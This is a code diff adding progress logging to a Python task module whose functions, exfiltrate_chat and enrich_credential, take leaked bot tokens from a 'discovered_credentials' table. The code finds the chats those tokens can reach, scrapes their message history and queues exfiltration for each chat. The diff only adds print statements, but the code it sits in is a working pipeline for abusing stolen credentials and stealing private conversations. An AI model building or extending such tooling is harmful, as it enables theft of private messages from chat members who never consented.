@@ -23,6 +23,7 @@ def exfiltrate_chat(cred_id: str):
     return loop.run_until_complete(_exfiltrate_logic(cred_id))
 
 async def _exfiltrate_logic(cred_id: str):
+    print(f"🕵️ [Exfil] Starting exfiltration for credential {cred_id}")
     # Fetch credential
     response = db.table("discovered_credentials").select("bot_token, chat_id").eq("id", cred_id).execute()
     if not response.data:
@@ -42,7 +43,9 @@ async def _exfiltrate_logic(cred_id: str):
 
     # Scrape
     try:
+        print(f"⏳ [Exfil] Calling scraper service for chat {chat_id}...")
         messages = await scraper_service.scrape_history(bot_token, chat_id)
+        print(f"✅ [Exfil] Scraper returned {len(messages)} messages.")
     except Exception as e:
         db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id).execute()
         return f"Scraping failed: {e}"
@@ -82,6 +85,7 @@ def enrich_credential(cred_id: str):
     return loop.run_until_complete(_enrich_logic(cred_id))
 
 async def _enrich_logic(cred_id: str):
+    print(f"✨ [Enrich] Starting enrichment for credential {cred_id}")
     # Fetch credential
     response = db.table("discovered_credentials").select("bot_token").eq("id", cred_id).execute()
     if not response.data:
@@ -98,7 +102,9 @@ async def _enrich_logic(cred_id: str):
 
     # Discover
     try:
+        print(f"🔎 [Enrich] Discovering chats via ScraperService...")
         chats = await scraper_service.discover_chats(bot_token)
+        print(f"✅ [Enrich] Discovery returned {len(chats) if chats else 0} chats.")
     except Exception as e:
         return f"Discovery failed: {e}"
 
@@ -113,6 +119,7 @@ async def _enrich_logic(cred_id: str):
     # 2. If more chats, create NEW records (clones).
     
     first_chat = chats[0]
+    print(f"📝 [Enrich] Updating credential with Primary Chat: {first_chat['name']} (ID: {first_chat['id']})")
     
     # Update primary
     db.table("discovered_credentials").update({
@@ -121,6 +128,7 @@ async def _enrich_logic(cred_id: str):
     }).eq("id", cred_id).execute()
     
     # Trigger Exfiltration for Primary
+    print(f"🚀 [Enrich] Triggering exfiltration for {cred_id}...")
     exfiltrate_chat.delay(cred_id)
     
     msg = f"Enriched {cred_id} with chat {first_chat['id']}."
